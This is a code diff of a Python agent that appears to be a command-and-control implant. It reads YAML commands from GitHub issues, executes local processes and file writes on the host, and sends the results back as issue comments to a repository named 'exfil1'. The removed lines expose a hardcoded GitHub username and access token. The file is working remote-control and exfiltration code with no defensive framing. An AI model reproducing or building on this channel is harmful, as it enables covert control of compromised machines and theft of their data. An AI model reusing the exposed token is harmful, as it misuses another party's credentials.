@@ -8,13 +8,17 @@ import time
 
 class CommandResponder:
 
-    def __init__(self, agentid, issue):
+    def __init__(self, config, agentid, issue):
+        self.config = config
         self.agentid = agentid
         self.issue = issue
 
-        self.ghuser_name = "drtkn"
-        self.ghtoken = "dbba5bd20be0a59543762bd19e881d351ce118c7"
-        self.ghrepo_name = "exfil1"
+        #print(yaml.dump(config))
+
+        self.ghuser_name = config.github()['git_user_name']
+        self.ghtoken = config.github()['git_app_token']
+        self.ghrepo_name = config.github()['git_repo_name']
+
         self.gh = Github(self.ghuser_name, self.ghtoken)
         self.ghuser = self.gh.get_user()
         self.ghrepo = self.ghuser.get_repo(self.ghrepo_name)
@@ -28,16 +32,20 @@ class CommandResponder:
             yield s[start:start+n]
 
     def setData(self, task_data):
+        # https://developer.github.com/v3/#rate-limiting
+        comment_dlimit=65536
+        wait_rlimit=2 # 2 seconds
+
         print("CommandResponder: Uploading data size {} for agent {}"
               "to GH (notify issue {} )".
               format(len(task_data), self.agentid, self.issue))
         # We can hit the limit of comment post. Split the output
-        if len(task_data) < 65536:
+        if len(task_data) < comment_dlimit:
             self.commentIssue(task_data)
         else:
-            for task_chunk in self._task_chunks(task_data, (65536-1)):
+            for task_chunk in self._task_chunks(task_data, (comment_dlimit-1)):
                 self.commentIssue(task_chunk)
-                time.sleep(2)  # https://developer.github.com/v3/#rate-limiting
+                time.sleep(wait_rlimit)
 
         self.closeIssue()
 
@@ -52,14 +60,15 @@ class CommandResponder:
 
 class CommandRouter:
 
-    def __init__(self, task, agentid, issue, data):
+    def __init__(self, config, task, agentid, issue, data):
+        self.config = config
         self.task = task
         self.data = data
-        self.responder = CommandResponder(agentid, issue)
+        self.responder = CommandResponder(config, agentid, issue)
 
     def run(self):
         task_switcher = {
-         "get_local_file_list": "FileTask",
+         "put_local_file": "PutLFileTask",
          "exec_local_process": "ExecLProcessTask"
         }
         module = importlib.import_module("gtasks")
@@ -98,7 +107,8 @@ class GitEventWatcher:
 
 class CommandParser:
 
-    def __init__(self, agentid, issue):
+    def __init__(self, config, agentid, issue):
+        self.config = config
         self.agentid = agentid
         self.issue = issue
 
@@ -115,33 +125,83 @@ class CommandParser:
                 for command in request['request']:
                     print(command)
                     cmd_switcher = {
-                        'getlocal': 'getlocal',
-                        'getremote': 'getremote',
+                        'putlocal': 'putlocal',
                         'execlocal': 'execlocal'
                     }
                     cmd = cmd_switcher.get(command.keys()[0], "nosuchcommand")
-                    getattr(CommandParser(self.agentid, self.issue),
+                    getattr(CommandParser(self.config, self.agentid, self.issue),
                             str(cmd))(command)
         else:
             print("CommandParser: Invalid request. no 'request' directive?")
             print(yaml.dump(request))
 
-    def getlocal(self, command):
-        cmd_params = command[CommandParser.getlocal.__name__]
-        print("CommandParser: Executing Local get: {}".format(cmd_params))
-        # {'resource': 'file', 'method': 'list', 'location': 'hello.txt'}}
+    # Put()'ing content via <file> resource on server
+    # {'put':
+    #   {
+    #       'resource': 'file',    <===
+    #       'location': '/path/to/file'
+    #   }
+    # }
+    def putlocal(self, command):
+        cmd_params = command[CommandParser.putlocal.__name__]
+        print("CommandParser: Executing Local put: {}".format(cmd_params))
+        # {'resource': 'file'}
         if 'resource' in cmd_params:
             res_switcher = {
-                'file': 'r_file'
+                'file': 'f_putlocal'
                 }
             cmd = res_switcher.get(cmd_params['resource'], "nosuchresource")
-            getattr(CommandParser(self.agentid, self.issue),
+            getattr(CommandParser(self.config, self.agentid, self.issue),
                     str(cmd))(cmd_params)
         else:
             print("CommandParser: No resource specified: {}".format(cmd_params))
 
-    def getremote(self, command):
-        print("CommandParser: Executing Remote get: {}".format(command))
+    # Put()'ing content via <file> resource on server
+    # {'put':
+    #   {
+    #       'resource': 'file',
+    #       'location': '/path/to/file'  <===
+    #   }
+    # }
+    def f_putlocal(self, cmd_params):
+        print("CommandParser: Executing Local put -> file: {}".
+              format(cmd_params))
+
+        if 'location' in cmd_params:
+            crouter = CommandRouter(self.config, 'put_local_file', self.agentid,
+                                    self.issue, cmd_params)
+            thread = threading.Thread(target=crouter.run)
+            thread.start()
+        else:
+            print("CommandParser: No method specified: {}".format(cmd_params))
+
+
+    # Exec()'ing <command> on server
+    def execlocal(self, command):
+        print("CommandParser: Executing Local exec: {}".format(command))
+        cmd_params = command[CommandParser.execlocal.__name__]
+        if 'resource' in cmd_params:
+            res_switcher = {
+                'process': 'c_execlocal'
+            }
+            cmd = res_switcher.get(cmd_params['resource'], "nosuchresource")
+            getattr(CommandParser(self.config, self.agentid, self.issue),
+                    str(cmd))(cmd_params)
+        else:
+            print("CommandParser: No resource specified: {}".format(cmd_params))
+
+    # Exec()'ing <command> via <process> resource on server
+    def c_execlocal(self, cmd_params):
+        print("CommandParser: Executing Local exec -> process: {}".
+              format(cmd_params))
+
+        if 'command' in cmd_params:
+            crouter = CommandRouter(self.config, 'exec_local_process', self.agentid,
+                                    self.issue, cmd_params)
+            thread = threading.Thread(target=crouter.run)
+            thread.start()
+        else:
+            print("CommandParser: No method specified: {}".format(cmd_params))
 
     def nosuchcommand(self, command):
         print("CommandParser: No such command {}".format(command))
@@ -151,64 +211,3 @@ class CommandParser:
 
     def nosuchfilemethod(self, command):
         print("CommandParser: No such file method {}".format(command))
-
-    def r_file(self, cmd_params):
-        # {'getlocal': {'resource': 'file',
-        # 'method': 'listdir', 'location': '/tmp'}}
-        print("CommandParser: Executing Local get -> file : {}".
-              format(cmd_params))
-
-        if 'method' in cmd_params:
-            met_switcher = {
-             'listdir': 'm_listdir',
-             'list': 'm_list'
-            }
-            cmd = met_switcher.get(cmd_params['method'], "nosuchfilemethod")
-            getattr(CommandParser(self.agentid, self.issue),
-                    str(cmd))(cmd_params)
-        else:
-            print("CommandParser: No method specified: {}".format(cmd_params))
-
-    def m_listdir(self, cmd_params):
-        # {'getlocal': {'resource': 'file',
-        # 'method': 'listdir', 'location': '/tmp'}}
-        print("CommandParser: Executing Local get -> file -> listdir{}".
-              format(cmd_params))
-
-    def m_list(self, cmd_params):
-        # {'getlocal': {'resource': 'file',
-        # 'method': 'list', 'location': '*.txt'}}
-        print("CommandParser: Executing Local get -> file -> list{}".
-              format(cmd_params))
-        if 'location' in cmd_params:
-            crouter = CommandRouter('get_local_file_list',
-                                    self.agentid, self.issue, cmd_params)
-            thread = threading.Thread(target=crouter.run)
-            thread.start()
-        else:
-            print("CommandParser: No method specified: {}".format(cmd_params))
-
-    def execlocal(self, command):
-        print("CommandParser: Executing Local exec: {}".format(command))
-        cmd_params = command[CommandParser.execlocal.__name__]
-        if 'resource' in cmd_params:
-            res_switcher = {
-                'process': 'c_execlocal'
-            }
-            cmd = res_switcher.get(cmd_params['resource'], "nosuchresource")
-            getattr(CommandParser(self.agentid, self.issue),
-                    str(cmd))(cmd_params)
-        else:
-            print("CommandParser: No resource specified: {}".format(cmd_params))
-
-    def c_execlocal(self, cmd_params):
-        print("CommandParser: Executing Local exec -> process: {}".
-              format(cmd_params))
-
-        if 'command' in cmd_params:
-            crouter = CommandRouter('exec_local_process', self.agentid,
-                                    self.issue, cmd_params)
-            thread = threading.Thread(target=crouter.run)
-            thread.start()
-        else:
-            print("CommandParser: No method specified: {}".format(cmd_params))
